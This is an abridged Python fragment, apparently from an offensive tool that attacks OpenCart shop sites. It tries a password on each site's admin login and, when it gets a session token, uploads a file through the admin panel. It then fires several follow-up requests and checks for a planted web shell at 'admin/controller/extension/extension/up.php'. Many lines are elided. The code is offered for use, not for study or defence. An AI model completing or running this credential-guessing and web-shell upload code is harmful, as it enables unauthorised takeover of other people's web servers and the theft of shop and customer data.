...
class OpenCart(object):
    ...
    def opencart(self, site, passwd):
        try:
            ...
            GoT = sess.post(url, data=PostData, headers=Headers, timeout=2)
            if 'user_token=' in str(GoT.content):
                try:
                    ...
                    try:
                        ...
                        res = sess.post('http://' + url, files=files, headers=Headers, timeout=2)
                        ...
                        sess.post('http://' + st1, headers=Headers, timeout=2)
                        sess.post('http://' + st2, headers=Headers, timeout=2)
                        sess.post('http://' + st3, headers=Headers, timeout=2)
                        sess.post('http://' + st4, headers=Headers, timeout=2)
                        sess.post('http://' + st5, headers=Headers, timeout=2)
                    except:
                        self.flag = 1

                    try:
                        Shell = site + '/admin/controller/extension/extension/up.php'
                        Check = sess.get('http://' + Shell, headers=Headers, timeout=2)
